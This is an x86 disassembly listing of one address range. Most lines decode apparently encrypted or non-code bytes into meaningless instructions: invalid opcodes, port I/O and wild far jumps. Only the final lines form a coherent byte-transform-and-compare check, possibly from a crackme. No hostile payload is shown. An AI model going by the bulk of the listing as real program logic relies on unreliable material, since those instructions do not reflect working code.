  4236a3:	outs   dx,BYTE PTR ds:[esi]
  4236a4:	mov    eax,ds:0xed320254
  4236a9:	gs jo  0x423676
  4236ac:	int    0xda
  4236ae:	xor    al,BYTE PTR [edi-0x70]
  4236b1:	pop    ebp
  4236b2:	ins    BYTE PTR es:[edi],dx
  4236b3:	imul   ebp,DWORD PTR [eax],0xfffffffa
  4236b6:	mov    eax,ds:0xd0fec682
  4236bb:	outs   dx,BYTE PTR ds:[esi]
  4236bc:	neg    bl
  4236be:	outs   dx,BYTE PTR ds:[esi]
  4236bf:	xchg   edi,eax
  4236c0:	sub    bh,BYTE PTR [ecx+eax*8]
  4236c3:	es jg  0x4236bd
  4236c6:	test   eax,0xda01d1c1
  4236cb:	adc    eax,0x8d8e5bed
  4236d0:	ds inc ebx
  4236d2:	ss clc 
  4236d4:	adc    al,0x8e
  4236d6:	retf   0xa6ff
  4236d9:	lahf   
  4236da:	mov    ds:0xd928a5df,eax
  4236df:	popf   
  4236e0:	sub    eax,0xa8f83436
  4236e5:	push   ebx
  4236e6:	outs   dx,DWORD PTR ds:[esi]
  4236e7:	in     eax,0x73
  4236e9:	stos   BYTE PTR es:[edi],al
  4236ea:	pop    esi
  4236eb:	test   eax,0x44a1f3ee
  4236f0:	adc    eax,DWORD PTR [edi]
  4236f2:	push   0xffffff93
  4236f4:	inc    ebx
  4236f5:	dec    edi
  4236f6:	(bad)
  4236f9:	aaa    
  4236fa:	mov    edx,DWORD PTR [ecx]
  4236fc:	outs   dx,DWORD PTR ds:[esi]
  4236fd:	pop    eax
  4236fe:	in     eax,dx
  4236ff:	inc    edi
  423700:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423701:	aas    
  423702:	inc    ebx
  423703:	sbb    eax,0x248d677f
  423708:	mov    dh,0x6e
  42370a:	mov    ds:0x7b144b70,al
  42370f:	stc    
  423710:	cmc    
  423711:	cmp    al,0xd3
  423713:	ret    
  423714:	adc    BYTE PTR [ecx],dl
  423716:	sti    
  423717:	mov    dl,0x41
  423719:	mov    ebx,0x56d85640
  42371e:	sbb    BYTE PTR [ebp+0x2b],0xd7
  423722:	mov    edx,0x5a1de941
  423727:	jle    0x4236aa
  423729:	xchg   BYTE PTR [edx+0x2fd029],ch
  42372f:	jge    0x42375b
  423731:	push   edi
  423732:	jmp    0x1c6afb52
  423737:	xor    eax,0xd5291d97
  42373c:	ret    
  42373d:	int    0x44
  42373f:	nop
  423740:	mov    ah,0xb9
  423742:	cwde   
  423743:	sub    al,0x6f
  423745:	xor    ebx,DWORD PTR [edx]
  423747:	xchg   ebp,eax
  423748:	xor    DWORD PTR [esi+edi*8],ebx
  42374b:	and    eax,0x1f49d452
  423750:	fldln2 
  423752:	fsubp  st(6),st
  423754:	es pop esi
  423756:	sbb    eax,DWORD PTR [ecx]
  423758:	aam    0x8
  42375a:	push   eax
  42375b:	inc    ebp
  42375c:	mov    eax,ds:0x811c3f61
  423761:	ror    DWORD PTR [esi],1
  423763:	xchg   esp,ebp
  423765:	sub    DWORD PTR [esi-0x62],esi
  423768:	(bad)  
  42376a:	pop    es
  42376b:	dec    edi
  42376c:	cld    
  42376d:	imul   esp,DWORD PTR [ebx+0x6a],0x5a
  423771:	or     ch,BYTE PTR [ebx]
  423773:	stos   BYTE PTR es:[edi],al
  423774:	daa    
  423775:	shl    DWORD PTR [esi-0x4e],0xba
  423779:	dec    edi
  42377a:	pusha  
  42377b:	cmc    
  42377c:	dec    eax
  42377d:	push   esp
  42377e:	sub    eax,0xc6e1b039
  423783:	(bad)  
  423785:	in     eax,dx
  423786:	mov    edi,edx
  423788:	or     eax,0x75973d74
  42378d:	add    dh,ah
  42378f:	jo     0x42378c
  423791:	pop    edx
  423792:	pop    esp
  423793:	dec    ecx
  423794:	test   BYTE PTR [ebp+0x64],bh
  423797:	mov    cl,0xc8
  423799:	inc    ebp
  42379a:	ret    
  42379b:	out    dx,al
  42379c:	stos   DWORD PTR es:[edi],eax
  42379d:	(bad)  
  42379e:	cmp    eax,esi
  4237a0:	out    0x70,al
  4237a2:	and    DWORD PTR ds:0x3e55d228,edx
  4237a8:	mov    bh,BYTE PTR [ebx]
  4237aa:	push   esi
  4237ab:	xor    al,0x3b
  4237ad:	sbb    al,0x31
  4237af:	or     ah,BYTE PTR [ecx-0x33]
  4237b2:	sub    al,0x81
  4237b4:	sti    
  4237b5:	sahf   
  4237b6:	stos   DWORD PTR es:[edi],eax
  4237b7:	sub    esp,edi
  4237b9:	push   ds
  4237ba:	inc    esp
  4237bb:	shl    BYTE PTR [esi+0x78],1
  4237be:	add    eax,DWORD PTR [ebp-0x5a008ea8]
  4237c4:	(bad)  
  4237c5:	dec    edi
  4237c6:	cmovl  ebx,esi
  4237c9:	rcl    dh,0x60
  4237cc:	and    al,0xb8
  4237ce:	es stos BYTE PTR es:[edi],al
  4237d0:	sub    bl,BYTE PTR [edx-0x15]
  4237d3:	shl    bl,0xaf
  4237d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4237d7:	sbb    BYTE PTR [ebx+0x2936c8b8],dl
  4237dd:	in     eax,0x28
  4237df:	or     dl,BYTE PTR [edi+0x7]
  4237e2:	aam    0x15
  4237e4:	push   eax
  4237e5:	hlt    
  4237e6:	scas   eax,DWORD PTR es:[edi]
  4237e7:	int    0x52
  4237e9:	mov    esi,0x3d0b84cb
  4237ee:	fs ret 
  4237f0:	(bad)  
  4237f1:	jecxz  0x423792
  4237f3:	jge    0x423834
  4237f5:	idiv   DWORD PTR [eax+eiz*4-0x6]
  4237f9:	add    ecx,ebx
  4237fb:	aaa    
  4237fc:	mov    dh,0xa5
  4237fe:	fld    DWORD PTR [ecx+ebx*2]
  423801:	adc    cl,dh
  423803:	push   esp
  423804:	mov    bh,0x8d
  423806:	out    dx,eax
  423807:	jmp    0x30b37d3f
  42380c:	(bad)
  423810:	cdq    
  423811:	mov    esp,0x3e413587
  423816:	pop    edx
  423817:	ins    DWORD PTR es:[edi],dx
  423818:	aad    0x20
  42381a:	pop    edi
  42381b:	pop    ss
  42381c:	push   ebx
  42381d:	push   esi
  42381e:	jmp    0x9444:0xfb9b0d26
  423825:	or     al,0x25
  423827:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423828:	sahf   
  423829:	add    DWORD PTR [eax+0x45a6713a],ebx
  42382f:	push   0x75
  423831:	data16 cmp ah,bh
  423834:	jge    0x423822
  423836:	sub    edx,DWORD PTR [ecx]
  423838:	xchg   DWORD PTR [ebp+0x5f],edx
  42383b:	and    ch,BYTE PTR [ebp-0x66]
  42383e:	or     cl,BYTE PTR ds:0xd67ddab
  423844:	cwde   
  423845:	out    dx,al
  423846:	sbb    al,0x13
  423848:	cmp    ah,BYTE PTR ds:[esi+0x34]
  42384c:	call   0xd4a:0xc11b9e9f
  423853:	mov    DWORD PTR [ebx-0x2bdcae02],edx
  423859:	inc    eax
  42385a:	adc    esi,DWORD PTR [edx+0xa]
  42385d:	or     bl,bl
  42385f:	mov    dl,0xd4
  423861:	lods   al,BYTE PTR ds:[esi]
  423862:	out    0x99,eax
  423864:	lods   al,BYTE PTR ds:[esi]
  423865:	xchg   esi,eax
  423866:	out    0xb5,al
  423868:	stos   BYTE PTR es:[edi],al
  423869:	jle    0x423865
  42386b:	outs   dx,BYTE PTR ds:[esi]
  42386c:	xlat   BYTE PTR ds:[ebx]
  42386d:	dec    ebp
  42386e:	adc    ebx,DWORD PTR [ebx+ebx*8]
  423871:	adc    eax,0x1fd34f62
  423876:	push   ebp
  423877:	sub    ebx,DWORD PTR [edi]
  423879:	not    cl
  42387b:	retf   0x2fb1
  42387e:	(bad)  
  42387f:	jne    0x4238da
  423881:	(bad)  
  423882:	test   al,0x53
  423884:	fwait
  423885:	shl    DWORD PTR [edx+0x7d385b4f],0x6a
  42388c:	jecxz  0x423859
  42388e:	(bad)  
  42388f:	lock pop ss
  423891:	imul   ecx,ebp,0xffffffdb
  423894:	dec    esi
  423895:	ins    BYTE PTR es:[edi],dx
  423896:	out    0x25,al
  423898:	xchg   ebx,eax
  423899:	in     eax,0x9c
  42389b:	ja     0x42383d
  42389d:	lods   eax,DWORD PTR ds:[esi]
  42389e:	retf   
  42389f:	adc    al,0x7f
  4238a1:	dec    edx
  4238a2:	pop    es
  4238a3:	out    dx,al
  4238a4:	shl    eax,cl
  4238a6:	sbb    eax,0xa766ed22
  4238ab:	push   ecx
  4238ac:	std    
  4238ad:	popa   
  4238ae:	std    
  4238af:	repnz sub eax,0x7b122502
  4238b5:	outs   dx,BYTE PTR ds:[esi]
  4238b6:	out    dx,eax
  4238b7:	push   edx
  4238b8:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  4238ba:	sahf   
  4238bb:	push   esp
  4238bc:	mov    esi,0x14d8d3bf
  4238c1:	aad    0x82
  4238c3:	push   edx
  4238c4:	push   eax
  4238c5:	jo     0x423862
  4238c7:	pop    es
  4238c8:	pop    eax
  4238c9:	out    0x75,eax
  4238cb:	xchg   ebp,eax
  4238cc:	ins    DWORD PTR es:[edi],dx
  4238cd:	(bad)  [eax-0x1d29358b]
  4238d3:	jo     0x4238dc
  4238d5:	pop    esp
  4238d6:	push   0xe30416f9
  4238db:	dec    esp
  4238dc:	adc    BYTE PTR [edx],ah
  4238de:	scas   al,BYTE PTR es:[edi]
  4238df:	adc    eax,0x6ce3f053
  4238e4:	cmp    eax,0xb985ad42
  4238e9:	pop    esp
  4238ea:	push   esi
  4238eb:	push   ebp
  4238ec:	loopne 0x4238ff
  4238ee:	aaa    
  4238ef:	sub    DWORD PTR [ebp-0x58],ecx
  4238f2:	dec    eax
  4238f3:	xchg   edx,eax
  4238f4:	(bad)  
  4238f5:	push   ebp
  4238f6:	fwait
  4238f7:	sub    dh,dh
  4238f9:	xchg   ebp,eax
  4238fa:	jae    0x4238ba
  4238fc:	lea    edx,[edx]
  4238fe:	in     al,dx
  4238ff:	xchg   eax,esp
  423901:	enter  0xa390,0x6d
  423905:	cmp    ecx,esp
  423907:	or     bl,BYTE PTR [edi]
  423909:	mov    al,ds:0x20f670ec
  42390e:	sbb    ah,BYTE PTR [esi-0x23]
  423911:	or     ch,bh
  423913:	cmp    eax,0x39df786e
  423918:	or     dh,BYTE PTR [ebp+0x1750123c]
  42391e:	adc    edx,DWORD PTR [esi]
  423920:	fisub  DWORD PTR [ecx+0xb]
  423923:	into   
  423924:	xor    eax,0xba88c0bd
  423929:	aas    
  42392a:	loop   0x4238b6
  42392c:	inc    esp
  42392d:	mov    bh,BYTE PTR [esi+0x7cd44521]
  423933:	add    DWORD PTR [edi-0x23f5cb71],0xffffffa6
  42393a:	(bad)  [esi]
  42393c:	push   ecx
  42393d:	or     ecx,DWORD PTR [esi-0x71b76675]
  423943:	xchg   ebp,esi
  423945:	fucomi st,st(7)
  423947:	fnstenv [ebx+ebp*4+0x4e]
  42394b:	pusha  
  42394c:	fwait
  42394d:	into   
  42394e:	cmp    esp,DWORD PTR [esi+0x3b53513]
  423954:	xor    al,0x9
  423956:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423957:	jb     0x4238e7
  423959:	pushf  
  42395a:	mov    ds:0x67826f52,eax
  42395f:	dec    esi
  423960:	push   edx
  423961:	mov    dl,0x11
  423963:	fcomip st,st(7)
  423965:	and    eax,0xa18e2258
  42396a:	nop
  42396b:	or     ah,BYTE PTR [ecx+0x26]
  42396e:	js     0x423946
  423970:	fld    TBYTE PTR [edi+eiz*1]
  423973:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423974:	dec    ebx
  423975:	adc    ebp,DWORD PTR [ebp-0x4e466768]
  42397b:	mov    al,0xc1
  42397d:	cmp    ecx,DWORD PTR [edx+esi*2]
  423980:	rcr    DWORD PTR [edi],0x50
  423983:	inc    esi
  423984:	ret    
  423985:	xor    al,0xb5
  423988:	xor    DWORD PTR [ecx+0x43],ecx
  42398b:	mov    bl,0x15
  42398d:	test   BYTE PTR [edi],al
  42398f:	sbb    DWORD PTR ds:[edi],eax
  423992:	pop    ecx
  423993:	rol    DWORD PTR [eax-0x62c7b9d5],1
  423999:	push   eax
  42399a:	push   ecx
  42399b:	inc    edx
  42399c:	pop    ebx
  42399d:	out    dx,al
  42399e:	mov    edi,0xdd7d8d8c
  4239a3:	sbb    eax,0x3b66bf9b
  4239a8:	adc    edx,edi
  4239aa:	mov    ebp,0x95819cf0
  4239af:	cli    
  4239b0:	(bad)  [ebp+0x78d17aa1]
  4239b6:	sahf   
  4239b7:	mov    ch,0xd7
  4239b9:	gs mov esp,0x7ee20884
  4239bf:	int3   
  4239c0:	add    eax,0xb48810d1
  4239c5:	xchg   esp,eax
  4239c6:	or     edi,ebp
  4239c8:	stos   BYTE PTR es:[edi],al
  4239c9:	lahf   
  4239ca:	and    eax,0x1638bd33
  4239cf:	mov    ch,0xc2
  4239d1:	lock outs dx,DWORD PTR ds:[esi]
  4239d3:	in     eax,0xb3
  4239d5:	pop    ecx
  4239d6:	cmc    
  4239d7:	or     bh,BYTE PTR [esp+esi*2-0x2b3543a1]
  4239de:	or     bl,BYTE PTR [edi+0x4a5d33d]
  4239e4:	push   ebp
  4239e5:	push   edi
  4239e6:	ror    BYTE PTR [edx],cl
  4239e8:	daa    
  4239e9:	add    al,0x26
  4239eb:	scas   al,BYTE PTR es:[edi]
  4239ec:	add    ecx,DWORD PTR [eax-0x7f58587f]
  4239f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4239f3:	stos   BYTE PTR es:[edi],al
  4239f4:	xor    DWORD PTR ds:0x68ff189e,ebx
  4239fa:	(bad)  
  4239fb:	(bad)  
  4239fc:	cs jl  0x4239b6
  4239ff:	push   edi
  423a00:	aaa    
  423a01:	push   ebp
  423a02:	das    
  423a03:	sub    al,0x74
  423a05:	clc    
  423a06:	cmc    
  423a07:	retf   0x34f4
  423a0a:	jge    0x423a35
  423a0c:	das    
  423a0d:	daa    
  423a0e:	sahf   
  423a0f:	pop    ebx
  423a10:	pop    edx
  423a11:	sbb    dh,ch
  423a13:	sbb    BYTE PTR [ebp+esi*8-0x6b17c60c],ah
  423a1a:	sub    BYTE PTR [ebp+0x7e],dl
  423a1d:	sub    esp,DWORD PTR [ebp+ebx*2-0x1f]
  423a21:	pop    ebx
  423a22:	adc    BYTE PTR [edx],0xc7
  423a25:	sub    dl,cl
  423a27:	pop    ecx
  423a28:	call   0xe2223128
  423a2d:	jbe    0x423a7e
  423a2f:	fmul   DWORD PTR [edi+0x6d]
  423a32:	push   esi
  423a33:	cmp    DWORD PTR [esi],ebx
  423a35:	popf   
  423a36:	or     edi,DWORD PTR [edi-0x2951e774]
  423a3c:	jbe    0x423a6d
  423a3e:	scas   eax,DWORD PTR es:[edi]
  423a3f:	mov    eax,0x7635309c
  423a44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423a45:	jmp    0x9a315b40
  423a4a:	dec    esp
  423a4b:	cld    
  423a4c:	jecxz  0x423a26
  423a4e:	inc    ebp
  423a4f:	pop    ecx
  423a50:	rol    BYTE PTR ds:0x39daff61,1
  423a56:	out    0xf2,eax
  423a58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423a59:	inc    ebp
  423a5a:	sub    DWORD PTR [edx-0x44f83ab],ecx
  423a60:	loop   0x423a1d
  423a62:	add    esi,DWORD PTR [ebp+0x75a1e3]
  423a68:	xchg   esi,eax
  423a69:	dec    ebx
  423a6a:	or     DWORD PTR [ebx],0xc098cd39
  423a70:	and    DWORD PTR [esi+0x1ea47de7],edi
  423a76:	xchg   DWORD PTR [edx-0xf],ebp
  423a79:	jge    0x423a90
  423a7b:	aad    0x36
  423a7d:	inc    edx
  423a7e:	and    DWORD PTR ds:0x11379f9e,edi
  423a84:	lahf   
  423a85:	fwait
  423a86:	mov    ebp,0x426190a9
  423a8b:	and    ah,ah
  423a8d:	jno    0x423a24
  423a8f:	mov    ch,0x40
  423a91:	pop    ecx
  423a92:	icebp  
  423a93:	cmp    al,0x4b
  423a95:	jns    0x423a9d
  423a97:	ins    DWORD PTR es:[edi],dx
  423a98:	xchg   edi,eax
  423a99:	add    DWORD PTR [edi-0x1c],ebx
  423a9c:	mov    eax,0xa2f86076
  423aa1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423aa2:	leave  
  423aa3:	ds mov edi,0x234840a3
  423aa9:	push   edi
  423aaa:	(bad)  
  423aac:	sub    bl,BYTE PTR [eax+ebp*4]
  423aaf:	(bad)  
  423ab1:	cs push 0x2c
  423ab4:	sbb    eax,0x139f3e43
  423ab9:	cli    
  423aba:	jmp    0x8a723d44
  423abf:	pop    esp
  423ac0:	xchg   ebp,eax
  423ac1:	lods   eax,DWORD PTR ds:[esi]
  423ac2:	inc    esi
  423ac3:	aad    0x2d
  423ac5:	cmc    
  423ac6:	push   edx
  423ac7:	xchg   ebx,eax
  423ac8:	lds    ecx,FWORD PTR [eax-0x41]
  423acb:	aas    
  423acc:	push   ss
  423acd:	iret   
  423ace:	mov    esi,0x1c49ea30
  423ad3:	cs in  al,0xf0
  423ad6:	out    0x3c,eax
  423ad8:	(bad)  
  423ad9:	cs push edi
  423adb:	dec    esi
  423adc:	pop    ds
  423add:	jno    0x423b47
  423adf:	inc    edx
  423ae0:	je     0x423b32
  423ae2:	imul   edi,DWORD PTR [edx+0x7c],0x44
  423ae6:	sbb    eax,0x92a5bbd9
  423aeb:	adc    ah,BYTE PTR [eax-0x7fab741a]
  423af1:	sub    edi,DWORD PTR [edx+0x3e]
  423af4:	(bad)  
  423af5:	outs   dx,DWORD PTR ds:[esi]
  423af6:	cmp    al,dl
  423af8:	(bad)  
  423af9:	adc    esi,DWORD PTR [esi-0x18e2c076]
  423aff:	test   al,0x67
  423b01:	data16 std 
  423b03:	jg     0x423ae9
  423b05:	addr16 int 0x4c
  423b08:	inc    ebx
  423b09:	test   BYTE PTR [ebx+0x7eff4b],bl
  423b0f:	int3   
  423b10:	push   es
  423b11:	sti    
  423b12:	fiadd  WORD PTR [ecx]
  423b14:	or     dh,BYTE PTR [edx]
  423b16:	add    al,0x2e
  423b18:	inc    ebx
  423b19:	jo     0x423ac5
  423b1b:	or     BYTE PTR [eax+0x3f9916b6],ah
  423b21:	pop    ebx
  423b22:	leave  
  423b23:	jp     0x423afe
  423b25:	stc    
  423b26:	sub    edi,DWORD PTR [ebp-0x2a]
  423b29:	lahf   
  423b2a:	in     al,0x81
  423b2c:	fwait
  423b2d:	scas   eax,DWORD PTR es:[edi]
  423b2e:	sahf   
  423b2f:	imul   ebp,DWORD PTR [edi+0x4e],0x158a19ba
  423b36:	jne    0x423b02
  423b38:	jb     0x423b11
  423b3a:	mov    bl,0x10
  423b3d:	mov    bl,0x10
  423b3f:	cld    
  423b40:	sbb    ebp,esp
  423b42:	xchg   ebx,eax
  423b43:	sbb    eax,0xdecd1527
  423b48:	push   0xffffffed
  423b4a:	ret    
  423b4b:	outs   dx,DWORD PTR ds:[esi]
  423b4c:	sbb    DWORD PTR [edx+0x5b],esi
  423b4f:	(bad)  [ecx+0x30]
  423b52:	mov    dl,BYTE PTR [edx]
  423b54:	fcom   QWORD PTR [eax+0x8]
  423b57:	jle    0x423ae6
  423b59:	bound  ecx,QWORD PTR [edi+0x62]
  423b5c:	mov    bl,0x88
  423b5e:	and    DWORD PTR [edx-0x25],0xcba624c1
  423b65:	test   BYTE PTR ds:0xa1261767,0x18
  423b6c:	rcr    BYTE PTR [edx-0x64812a88],1
  423b72:	iret   
  423b73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423b74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423b75:	add    bl,bh
  423b77:	jmp    0x8200b7ca
  423b7c:	in     eax,0xd6
  423b7e:	add    eax,0xe1f9c493
  423b83:	push   ss
  423b84:	inc    ecx
  423b85:	push   ds
  423b86:	mov    WORD PTR [ebx-0x694ca2c],fs
  423b8c:	(bad)  
  423b8d:	cmp    al,0x3f
  423b8f:	in     eax,dx
  423b90:	ss sub eax,0xe8e6ebc1
  423b96:	cdq    
  423b97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423b98:	imul   ecx,DWORD PTR [ecx],0xfffffff1
  423b9b:	inc    ebp
  423b9c:	and    ebx,DWORD PTR ss:[edi]
  423b9f:	std    
  423ba0:	leave  
  423ba1:	dec    edi
  423ba2:	(bad)
  423ba5:	cmp    DWORD PTR [edi-0x6813bee5],esp
  423bab:	ret    
  423bac:	outs   dx,DWORD PTR ds:[esi]
  423bad:	push   edi
  423bae:	das    
  423baf:	outs   dx,DWORD PTR ds:[esi]
  423bb0:	pop    ecx
  423bb1:	fwait
  423bb2:	sahf   
  423bb3:	int3   
  423bb4:	or     al,0x9b
  423bb6:	js     0x423be1
  423bb8:	es ins BYTE PTR es:[edi],dx
  423bba:	into   
  423bbb:	sub    BYTE PTR [eax+0x16],dl
  423bbe:	or     dh,al
  423bc0:	jecxz  0x423bc5
  423bc2:	xchg   DWORD PTR [ecx+0x794bae78],edi
  423bc8:	lods   eax,DWORD PTR ds:[esi]
  423bc9:	push   edi
  423bca:	fcomp  DWORD PTR [edx-0x3]
  423bcd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423bce:	fdiv   QWORD PTR [ecx-0x45c343be]
  423bd4:	xchg   edx,eax
  423bd5:	xor    al,0xbf
  423bd7:	push   es
  423bd8:	jnp    0x423b5d
  423bda:	inc    edi
  423bdb:	out    0x5f,eax
  423bdd:	or     edi,eax
  423bdf:	dec    eax
  423be0:	pop    esp
  423be1:	pop    ebp
  423be2:	test   al,0x60
  423be4:	loopne 0x423b98
  423be6:	mov    ebp,0x29b0be0e
  423beb:	or     ah,ch
  423bed:	inc    ebp
  423bee:	ins    BYTE PTR es:[edi],dx
  423bef:	fidiv  DWORD PTR [edx]
  423bf1:	out    dx,al
  423bf2:	mov    WORD PTR [esi],gs
  423bf4:	lods   eax,DWORD PTR ds:[esi]
  423bf5:	lock sub esp,eax
  423bf8:	mov    dh,0x7a
  423bfa:	les    edi,FWORD PTR [edi+0x29]
  423bfd:	and    cl,0x1b
  423c00:	or     ebx,DWORD PTR [edx+0x61a8ae0d]
  423c06:	jnp    0x423c68
  423c08:	xlat   BYTE PTR ds:[ebx]
  423c09:	push   ecx
  423c0a:	push   cs
  423c0b:	cmp    BYTE PTR [ecx],0x7e
  423c0e:	add    al,BYTE PTR [ebx-0x7620a5ec]
  423c14:	arpl   WORD PTR [edx-0x53ac86af],bx
  423c1a:	or     ebx,DWORD PTR [ecx+0x3aa81f18]
  423c20:	in     eax,0xc0
  423c22:	fucomip st,st(4)
  423c24:	imul   ebp,edi,0xfffffff9
  423c27:	mov    ah,0xa4
  423c29:	div    DWORD PTR [edx+ebx*1-0x52]
  423c2d:	and    eax,0xf2c623c9
  423c32:	add    DWORD PTR [esi+0x15],ebx
  423c35:	dec    ecx
  423c36:	mov    ebx,DWORD PTR [eax]
  423c38:	(bad)  
  423c39:	or     eax,0xb1f905b8
  423c3e:	fimul  DWORD PTR [esi]
  423c40:	jae    0x423c17
  423c42:	fist   DWORD PTR [ebx+0x246af1e7]
  423c48:	gs pop ds
  423c4a:	test   al,0x4c
  423c4c:	mov    ds:0x83fb3938,al
  423c51:	cdq    
  423c52:	mov    ecx,ecx
  423c54:	fwait
  423c55:	icebp  
  423c56:	xchg   ecx,eax
  423c57:	loopne 0x423c91
  423c59:	int3   
  423c5a:	pop    DWORD PTR [edx+0x570110c1]
  423c60:	mov    eax,ds:0xa560721d
  423c65:	ss jmp 0xdaf6:0xee2a1e0c
  423c6d:	into   
  423c6e:	add    al,ah
  423c70:	pushf  
  423c71:	sar    ch,1
  423c73:	mov    fs,esi
  423c75:	call   0xf52b:0x237ea269
  423c7c:	jmp    0xfa94:0x1a6e5f8c
  423c83:	or     eax,0x507136e6
  423c88:	scas   al,BYTE PTR es:[edi]
  423c89:	or     edi,esi
  423c8b:	pop    edx
  423c8c:	jmp    0xbd44:0x8c651dfa
  423c93:	mov    esp,0x8935f225
  423c98:	sub    DWORD PTR [ecx],edi
  423c9a:	out    0xe4,al
  423c9c:	loope  0x423d11
  423c9e:	mov    BYTE PTR [ebp-0x6a084006],ch
  423ca4:	jbe    0x423c95
  423ca6:	dec    edi
  423ca7:	mov    eax,0x213c8872
  423cac:	in     eax,dx
  423cad:	retf   0xb28c
  423cb0:	sub    al,0x56
  423cb2:	pusha  
  423cb3:	pop    esi
  423cb4:	imul   ebx,edx,0x96be4995
  423cba:	mov    ch,0x43
  423cbc:	std    
  423cbd:	jl     0x423cc6
  423cbf:	mov    ecx,0xe40b65e6
  423cc4:	call   0x69ebc4b2
  423cc9:	cmp    al,0xce
  423ccb:	imul   ebx
  423ccd:	pop    eax
  423cce:	or     edx,DWORD PTR [eax+0x6d]
  423cd1:	jmp    0x423d15
  423cd3:	popa   
  423cd4:	adc    ah,BYTE PTR [edx+0x6535e621]
  423cda:	mov    ah,0x86
  423cdc:	pop    ebx
  423cdd:	pop    edx
  423cde:	unpcklps xmm3,XMMWORD PTR [eax-0x2c]
  423ce2:	mov    al,ds:0xe57a6e07
  423ce7:	popf   
  423ce8:	push   es
  423ce9:	rcl    DWORD PTR [edi],0x24
  423cec:	gs push edx
  423cee:	retf   0x49b1
  423cf1:	pop    ebx
  423cf2:	lods   eax,DWORD PTR ds:[esi]
  423cf3:	or     ah,BYTE PTR [ecx+ebx*8]
  423cf6:	in     al,dx
  423cf7:	aam    0x1f
  423cf9:	push   ss
  423cfa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423cfb:	js     0x423cc2
  423cfd:	fs and eax,0x531eca2c
  423d03:	aam    0x78
  423d05:	stc    
  423d06:	sti    
  423d07:	xchg   ebp,eax
  423d08:	inc    edx
  423d09:	cmp    BYTE PTR [edx+0x54],al
  423d0c:	adc    al,0xbb
  423d0e:	rcl    DWORD PTR [edx],cl
  423d10:	ins    BYTE PTR es:[edi],dx
  423d11:	xor    BYTE PTR ds:0x20ac3a92,0x5a
  423d18:	adc    DWORD PTR [esi+0x3ae90db5],eax
  423d1e:	(bad)  
  423d1f:	lock jmp 0x423ca7
  423d22:	sub    DWORD PTR [esi],ebp
  423d24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423d25:	add    al,0xcf
  423d27:	dec    eax
  423d28:	sub    esi,DWORD PTR [edx+0x7b272937]
  423d2e:	in     eax,0x61
  423d30:	sub    BYTE PTR [eax+0x359b0253],ch
  423d36:	cmp    ah,bh
  423d38:	in     al,0x5e
  423d3a:	aad    0x7b
  423d3c:	pop    edi
  423d3d:	mov    ecx,0xac980bd4
  423d42:	jmp    0xffd2:0xd6ce8c89
  423d49:	mov    eax,ds:0xa926506f
  423d4e:	int    0xcd
  423d50:	jbe    0x423d5d
  423d52:	imul   esi,DWORD PTR [ebp+0x3d8d39ae],0xffffffc5
  423d59:	aas    
  423d5a:	xchg   edi,eax
  423d5b:	mov    edx,0x3e0fbdd8
  423d60:	pop    eax
  423d61:	popf   
  423d62:	mov    BYTE PTR [esi+0x4d],ah
  423d65:	rcr    DWORD PTR [ebx],1
  423d67:	(bad)  
  423d69:	lahf   
  423d6a:	sub    BYTE PTR [ebp+ebp*1+0x1d5a852e],dh
  423d71:	loopne 0x423cf3
  423d73:	pminub mm3,QWORD PTR [ebx]
  423d76:	pusha  
  423d77:	sar    BYTE PTR [edi+0x5f],0x27
  423d7b:	jmp    0x7ecd284e
  423d80:	push   esi
  423d81:	aas    
  423d82:	push   ebx
  423d83:	adc    al,0xf9
  423d85:	(bad)  
  423d87:	xor    esi,DWORD PTR [ebp-0x41]
  423d8a:	add    BYTE PTR [ecx+0x386908bb],dl
  423d90:	fimul  DWORD PTR [ecx+0xb]
  423d93:	enter  0xeab1,0x59
  423d97:	sahf   
  423d98:	call   0xec01:0x7dfc0150
  423d9f:	jno    0x423d3f
  423da1:	and    eax,0x7532d1cb
  423da6:	jnp    0x423d84
  423da8:	push   ebx
  423da9:	loop   0x423d78
  423dab:	push   0xee8a7e9
  423db0:	jg     0x423db0
  423db2:	adc    ah,BYTE PTR [ebx+ebp*1]
  423db5:	mov    eax,0x76308473
  423dba:	inc    ecx
  423dbb:	sub    dl,BYTE PTR [ecx]
  423dbd:	shr    BYTE PTR ds:0x861f3bb7,1
  423dc3:	jne    0x423dbf
  423dc5:	ds in  eax,dx
  423dc7:	push   es
  423dc8:	dec    DWORD PTR es:[edx]
  423dcb:	out    0xcb,al
  423dcd:	xchg   ebp,eax
  423dce:	xor    DWORD PTR [esi],edi
  423dd0:	jg     0x423e09
  423dd2:	pushf  
  423dd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423dd5:	pop    edx
  423dd6:	pop    edi
  423dd7:	test   eax,eax
  423dd9:	leave  
  423dda:	pop    ds
  423ddb:	fcom   QWORD PTR [ecx+0x7f2ff9f3]
  423de1:	test   edx,esi
  423de3:	(bad)  [ecx-0x127c238d]
  423de9:	mov    ebp,0x81999446
  423dee:	mov    ecx,0xd57f796
  423df3:	ins    BYTE PTR es:[edi],dx
  423df4:	push   cs
  423df5:	pop    esi
  423df6:	xchg   esp,eax
  423df7:	jnp    0x423dea
  423df9:	imul   ecx,DWORD PTR [edi-0xf],0x4a5ede9c
  423e00:	add    al,0x4f
  423e02:	mov    eax,DWORD PTR [ebp+0x8]
  423e05:	movsx  eax,BYTE PTR [eax]
  423e08:	mov    edx,0x3272f6
  423e0d:	sub    eax,edx
  423e0f:	mov    ecx,0x75108af
  423e14:	xor    eax,ecx
  423e16:	cmp    eax,0xf89c85f8
  423e1b:	mov    DWORD PTR ds:0x428e97,0x5a9f
  423e25:	jne    0x423e8a
